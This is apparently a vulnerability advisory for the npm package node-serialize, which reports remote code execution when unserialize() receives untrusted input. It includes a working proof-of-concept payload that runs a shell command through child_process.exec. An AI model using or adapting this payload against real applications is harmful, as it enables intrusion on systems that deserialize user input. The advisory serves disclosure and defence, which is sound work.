## Overview
[`node-serialize`](https://www.npmjs.com/package/node-serialize) serializes an object and it's function into a JSON.

Affected versions of this package are vulnerable to Arbitrary Code Execution when untrusted user-input is passed into the `unserialize()` function.

**Example:**
```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

## Remediation
There is no fix version for `node-serialize`

## References
- [Opsecx Blog]( https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
- [GitHub Issue](https://github.com/luin/serialize/issues/4)
